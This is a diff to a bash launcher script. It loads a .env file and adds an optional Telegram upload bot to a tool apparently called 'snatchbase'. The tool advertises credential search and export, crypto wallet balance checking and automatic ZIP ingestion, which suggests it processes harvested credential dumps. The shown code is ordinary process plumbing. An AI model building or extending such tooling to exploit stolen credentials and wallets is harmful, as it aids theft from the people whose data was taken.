@@ -92,6 +92,13 @@ fi
 
 cd ..
 
+# Load environment variables if .env exists
+if [ -f "backend/.env" ]; then
+    print_status "Loading environment variables..."
+    export $(cat backend/.env | grep -v '^#' | xargs)
+    print_success "Environment variables loaded"
+fi
+
 # Start backend
 print_status "Starting backend server..."
 cd backend
@@ -109,6 +116,20 @@ for i in {1..10}; do
     sleep 1
 done
 print_success "Backend server started (PID: $BACKEND_PID)"
+
+# Start Telegram bot if configured
+if [ ! -z "$TELEGRAM_BOT_TOKEN" ] && [ ! -z "$TELEGRAM_ALLOWED_USER_ID" ]; then
+    print_status "Starting Telegram bot..."
+    cd backend
+    source venv/bin/activate
+    python3 run_telegram_bot.py > /tmp/snatchbase-telegram-bot.log 2>&1 &
+    TELEGRAM_BOT_PID=$!
+    cd ..
+    print_success "Telegram bot started (PID: $TELEGRAM_BOT_PID)"
+else
+    print_warning "Telegram bot not configured (skipping)"
+    TELEGRAM_BOT_PID=""
+fi
 
 # Start frontend
 print_status "Starting frontend server..."
@@ -132,21 +153,33 @@ echo "📊 Access Points:"
 echo "   • Frontend:    http://localhost:3000"
 echo "   • Backend API: http://localhost:8000"
 echo "   • API Docs:    http://localhost:8000/docs"
+if [ ! -z "$TELEGRAM_BOT_PID" ]; then
+    echo "   • Telegram Bot: Active (Send files to @ermachook_bot)"
+fi
 echo ""
 echo "🔧 Features Available:"
 echo "   • Credential Search & Export (TXT/CSV)"
 echo "   • Wallet Balance Checking (ETH/SOL/BTC)"
 echo "   • Device & System Analytics"
 echo "   • Auto ZIP Ingestion"
+if [ ! -z "$TELEGRAM_BOT_PID" ]; then
+    echo "   • Telegram File Upload"
+fi
 echo ""
 echo "📦 Auto-Ingestion:"
 echo "   • Drop ZIP files into: backend/data/incoming/uploads/"
+if [ ! -z "$TELEGRAM_BOT_PID" ]; then
+    echo "   • Send ZIP files via Telegram: @ermachook_bot"
+fi
 echo "   • Backend automatically processes them"
 echo "   • View results in the web interface"
 echo ""
 echo "📝 Logs:"
 echo "   • Backend:  tail -f /tmp/snatchbase-backend.log"
 echo "   • Frontend: tail -f /tmp/snatchbase-frontend.log"
+if [ ! -z "$TELEGRAM_BOT_PID" ]; then
+    echo "   • Telegram: tail -f /tmp/snatchbase-telegram-bot.log"
+fi
 echo ""
 echo "🛑 Press Ctrl+C to stop all services"
 echo ""
@@ -157,6 +190,9 @@ cleanup() {
     echo "Stopping services..."
     kill $BACKEND_PID 2>/dev/null
     kill $FRONTEND_PID 2>/dev/null
+    if [ ! -z "$TELEGRAM_BOT_PID" ]; then
+        kill $TELEGRAM_BOT_PID 2>/dev/null
+    fi
     echo "✓ All services stopped"
     exit 0
 }
